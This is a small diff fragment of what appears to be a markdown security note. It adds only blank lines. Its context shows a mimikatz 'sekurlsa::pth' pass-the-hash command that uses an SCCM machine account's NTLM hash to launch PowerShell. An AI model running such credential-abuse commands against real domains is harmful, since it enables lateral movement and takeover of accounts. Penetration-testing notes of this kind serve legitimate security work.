@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:19.158023+00:00'
 ```bash
 mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
 ```
+
+
